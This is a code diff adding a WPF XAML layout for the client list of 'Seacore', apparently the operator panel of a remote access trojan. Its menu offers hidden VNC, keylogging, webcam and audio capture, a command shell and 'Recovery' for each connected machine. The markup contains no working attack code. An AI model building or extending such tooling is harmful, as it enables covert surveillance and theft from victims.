@@ -1,0 +1,236 @@
+﻿<UserControl x:Class="Seacore.Resources.Usercontrols.Client" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"  xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
+             xmlns:local="clr-namespace:Seacore.Resources.Usercontrols"
+             mc:Ignorable="d" d:DesignHeight="585" d:DesignWidth="1050">
+
+    <Grid>
+        <TextBlock Text="Clients" FontSize="18" Foreground="#fff" Margin="54,-35,0,0" HorizontalAlignment="Left" VerticalAlignment="Top" />
+        <ListView x:Name="clientsListView" Background="Transparent" BorderThickness="0" ItemsSource="{Binding ConnectedClients}">
+            <ListView.ContextMenu>
+                <ContextMenu>
+                    <MenuItem Header="System Info" Icon="" Cursor="Hand" />
+                    <MenuItem Header="Notes" Icon="" Cursor="Hand" />
+                    <Separator/>
+                    <MenuItem Header="Control" Icon="" >
+                        <MenuItem Header="Hidden VNC" Icon="" Cursor="Hand" />
+                        <MenuItem Header="Remote Desktop" Icon="" Cursor="Hand" Click="RemoteDesktopMenuItem_Click" />
+                        <MenuItem Header="Webcam Control" Icon="" Cursor="Hand" Click="WebcamMenuItem_Click" />
+                        <MenuItem Header="Audio Control" Icon="" Cursor="Hand" Click="AudioMenuItem_Click" />
+                        <MenuItem Header="Keylogger" Icon="" >
+                            <MenuItem Header="Online" Icon="" Cursor="Hand" Click="KeyloggerOnlineMenuItem_Click" />
+                            <MenuItem Header="Offline" Icon="" Cursor="Hand" Click="KeyloggerOfflineMenuItem_Click" />
+                            <MenuItem Header="Advanced Online" Icon="" Cursor="Hand" />
+                        </MenuItem>
+                        <MenuItem Header="CMD" Icon="" Cursor="Hand" />
+                    </MenuItem>
+                    <MenuItem Header="Management" Icon="" >
+                        <MenuItem Header="File Manager" Icon="" Cursor="Hand" Click="FileManagerMenuItem_Click" />
+                        <MenuItem Header="Task Manager" Icon="" Cursor="Hand" />
+                        <MenuItem Header="Registry Manager" Icon="" Cursor="Hand" />
+                        <MenuItem Header="Startup Manager" Icon="" Cursor="Hand" />
+                        <MenuItem Header="Clipboard Manager" Icon="" Cursor="Hand" Click="ClipboardMenuItem_Click" />
+                        <MenuItem Header="TCP Connections" Icon="" Cursor="Hand" />
+                    </MenuItem>
+                    <MenuItem Header="Recovery" Icon="" Cursor="Hand" Click="RecoveryManagerMenuItem_Click"/>
+                    <Separator/>
+                    <MenuItem Header="Options" Icon="" Click="OptionsMenuItem_Click" />
+                    <Separator/>
+                    <MenuItem Header="Miscellaneous" Icon="" >
+                        <MenuItem Header="Open URL" Icon="" Cursor="Hand" />
+                        <MenuItem Header="Message Box" Icon="" Cursor="Hand" />
+                        <MenuItem Header="Client Chat" Icon="" Cursor="Hand" />
+                        <MenuItem Header="Report Window" Icon="" Cursor="Hand" />
+                        <MenuItem Header="IP Geolocation" Icon="" Cursor="Hand" />
+                        <MenuItem Header="Environment Variables" Icon="" Cursor="Hand" />
+                    </MenuItem>
+                    <MenuItem Header="System Controls" Icon="" >
+                        <MenuItem Header="Reconnect" Click="ReconnectBTN_Click" Icon="" Cursor="Hand" />
+                        <MenuItem Header="Disconnect" Click="DisconnectBTN_Click" Icon="" Cursor="Hand" />
+                    </MenuItem>
+                    <MenuItem Header="Power" Icon="" >
+                        <MenuItem Header="Shutdown" Icon="" Cursor="Hand" />
+                        <MenuItem Header="Restart" Icon="" Cursor="Hand" />
+                        <MenuItem Header="Sleep" Icon="" Cursor="Hand" />
+                        <MenuItem Header="Logoff" Icon="" Cursor="Hand" />
+                    </MenuItem>
+                </ContextMenu>
+            </ListView.ContextMenu>
+            <ListView.View>
+                <GridView>
+                    <GridView.ColumnHeaderContainerStyle>
+                        <Style TargetType="{x:Type GridViewColumnHeader}" BasedOn="{StaticResource BaseHeaderStyle}">
+                            <Setter Property="Height" Value="38"/>
+                        </Style>
+                    </GridView.ColumnHeaderContainerStyle>
+
+                    <GridViewColumn Header="Location" Width="140">
+                        <GridViewColumn.CellTemplate>
+                            <DataTemplate>
+                                <StackPanel Orientation="Horizontal">
+                                    <Image Source="{Binding LocationImg}" Width="32" Height="32" Margin="5,0,5,0"/>
+                                    <TextBlock Text="{Binding Location}" Foreground="White" FontSize="15"/>
+                                </StackPanel>
+                            </DataTemplate>
+                        </GridViewColumn.CellTemplate>
+                    </GridViewColumn>
+
+                    <GridViewColumn Header="IP" Width="120">
+                        <GridViewColumn.CellTemplate>
+                            <DataTemplate>
+                                <TextBlock Text="{Binding PublicIP}" Foreground="White" FontSize="15"/>
+                            </DataTemplate>
+                        </GridViewColumn.CellTemplate>
+                    </GridViewColumn>
+
+                    <GridViewColumn Header="Username" Width="150">
+                        <GridViewColumn.CellTemplate>
+                            <DataTemplate>
+                                <TextBox Text="{Binding Username, UpdateSourceTrigger=PropertyChanged}" Background="Transparent" Foreground="White" FontSize="15" BorderThickness="0"/>
+                            </DataTemplate>
+                        </GridViewColumn.CellTemplate>
+                    </GridViewColumn>
+
+                    <GridViewColumn Header="OS" Width="85">
+                        <GridViewColumn.CellTemplate>
+                            <DataTemplate>
+                                <StackPanel Orientation="Horizontal">
+                                    <Image Source="{Binding OSImg}" Margin="5,0,5,0"/>
+                                    <TextBlock Text="{Binding OS}" Foreground="White" FontSize="15"/>
+                                </StackPanel>
+                            </DataTemplate>
+                        </GridViewColumn.CellTemplate>
+                    </GridViewColumn>
+
+                    <GridViewColumn Header="Ping" Width="80">
+                        <GridViewColumn.CellTemplate>
+                            <DataTemplate>
+                                <TextBlock Text="{Binding Ping, StringFormat={}{0} ms}" Foreground="White" FontSize="15" HorizontalAlignment="Center"/>
+                            </DataTemplate>
+                        </GridViewColumn.CellTemplate>
+                    </GridViewColumn>
+
+                    <GridViewColumn Header="Version" Width="130">
+                        <GridViewColumn.CellTemplate>
+                            <DataTemplate>
+                                <TextBox Text="{Binding Version}" Foreground="White" FontSize="15"/>
+                            </DataTemplate>
+                        </GridViewColumn.CellTemplate>
+                    </GridViewColumn>
+
+                    <GridViewColumn Header="Date" Width="160">
+                        <GridViewColumn.CellTemplate>
+                            <DataTemplate>
+                                <TextBlock Text="{Binding Created}" Foreground="White" FontSize="15"/>
+                            </DataTemplate>
+                        </GridViewColumn.CellTemplate>
+                    </GridViewColumn>
+                </GridView>
+            </ListView.View>
+
+            <ListView.ItemContainerStyle>
+                <Style TargetType="ListViewItem">
+                    <Setter Property="Template">
+                        <Setter.Value>
+                            <ControlTemplate TargetType="ListViewItem">
+                                <Border x:Name="bg" Background="Transparent" Height="34" HorizontalAlignment="Stretch" Cursor="Hand">
+                                    <Grid>
+                                        <Border x:Name="hoverIndicator" Background="#4B4990" Opacity="0"/>
+                                        <Border x:Name="focusIndicator" Background="#4B4990" Opacity="0"/>
+
+                                        <Grid>
+                                            <Grid.ColumnDefinitions>
+                                                <ColumnDefinition Width="140"/>
+                                                <ColumnDefinition Width="120"/>
+                                                <ColumnDefinition Width="150"/>
+                                                <ColumnDefinition Width="85"/>
+                                                <ColumnDefinition Width="80"/>
+                                                <ColumnDefinition Width="130"/>
+                                                <ColumnDefinition Width="160"/>
+                                            </Grid.ColumnDefinitions>
+
+                                            <!-- Location -->
+                                            <StackPanel Orientation="Horizontal" HorizontalAlignment="Center">
+                                                <Image Source="{Binding LocationImg}" Width="17" Height="17" Margin="0,0,5,0"/>
+                                                <TextBlock Text="{Binding Location}" FontSize="14" Foreground="#fff" VerticalAlignment="Center" HorizontalAlignment="Center"/>
+                                            </StackPanel>
+
+                                            <!-- IP Address -->
+                                            <TextBlock Text="{Binding PublicIP}" FontSize="14" Foreground="#fff" VerticalAlignment="Center" HorizontalAlignment="Center" Grid.Column="1"/>
+
+                                            <!-- Username -->
+                                            <TextBlock Text="{Binding Username}" FontSize="14" Foreground="#fff" VerticalAlignment="Center" HorizontalAlignment="Center" Grid.Column="2"/>
+
+                                            <!-- OS -->
+                                            <StackPanel Orientation="Horizontal" Grid.Column="3" HorizontalAlignment="Center">
+                                                <TextBlock Text="{Binding OS}" Margin="0,0,5,0" FontSize="14" Foreground="#fff" VerticalAlignment="Center" />
+                                                <Image Source="{Binding OSImg}" Height="17" VerticalAlignment="Center" />
+                                            </StackPanel>
+
+                                            <!-- Ping -->
+                                            <TextBlock Text="{Binding Ping, StringFormat={}{0} ms}" FontSize="14" Foreground="#fff" VerticalAlignment="Center" HorizontalAlignment="Center" Grid.Column="4"/>
+
+                                            <!-- Version -->
+                                            <TextBlock Text="{Binding Version}" FontSize="14" Foreground="#fff" VerticalAlignment="Center" HorizontalAlignment="Center" Grid.Column="5"/>
+
+                                            <!-- Date Created -->
+                                            <TextBlock Text="{Binding Created}" FontSize="14" Foreground="#fff" VerticalAlignment="Center" HorizontalAlignment="Center" Grid.Column="6"/>
+                                        </Grid>
+                                    </Grid>
+                                </Border>
+
+                                <ControlTemplate.Triggers>
+                                    <MultiTrigger>
+                                        <MultiTrigger.Conditions>
+                                            <Condition Property="IsMouseOver" Value="True"/>
+                                            <Condition Property="IsFocused" Value="False"/>
+                                        </MultiTrigger.Conditions>
+                                        <MultiTrigger.EnterActions>
+                                            <BeginStoryboard>
+                                                <Storyboard>
+                                                    <DoubleAnimation Storyboard.TargetName="hoverIndicator"
+                                                                     Storyboard.TargetProperty="Opacity"
+                                                                     To="0.1" Duration="0:0:0.2"/>
+                                                </Storyboard>
+                                            </BeginStoryboard>
+                                        </MultiTrigger.EnterActions>
+                                        <MultiTrigger.ExitActions>
+                                            <BeginStoryboard>
+                                                <Storyboard>
+                                                    <DoubleAnimation Storyboard.TargetName="hoverIndicator"
+                                                                     Storyboard.TargetProperty="Opacity"
+                                                                     To="0" Duration="0:0:0.2"/>
+                                                </Storyboard>
+                                            </BeginStoryboard>
+                                        </MultiTrigger.ExitActions>
+                                    </MultiTrigger>
+                                    <MultiTrigger>
+                                        <MultiTrigger.Conditions>
+                                            <Condition Property="IsFocused" Value="True"/>
+                                        </MultiTrigger.Conditions>
+                                        <MultiTrigger.EnterActions>
+                                            <BeginStoryboard>
+                                                <Storyboard>
+                                                    <DoubleAnimation Storyboard.TargetName="focusIndicator"
+                                                                     Storyboard.TargetProperty="Opacity"
+                                                                     To="0.2" Duration="0:0:0.2"/>
+                                                </Storyboard>
+                                            </BeginStoryboard>
+                                        </MultiTrigger.EnterActions>
+                                        <MultiTrigger.ExitActions>
+                                            <BeginStoryboard>
+                                                <Storyboard>
+                                                    <DoubleAnimation Storyboard.TargetName="focusIndicator"
+                                                                     Storyboard.TargetProperty="Opacity"
+                                                                     To="0" Duration="0:0:0.2"/>
+                                                </Storyboard>
+                                            </BeginStoryboard>
+                                        </MultiTrigger.ExitActions>
+                                    </MultiTrigger>
+                                </ControlTemplate.Triggers>
+                            </ControlTemplate>
+                        </Setter.Value>
+                    </Setter>
+                </Style>
+            </ListView.ItemContainerStyle>
+        </ListView>
+    </Grid>
+</UserControl>
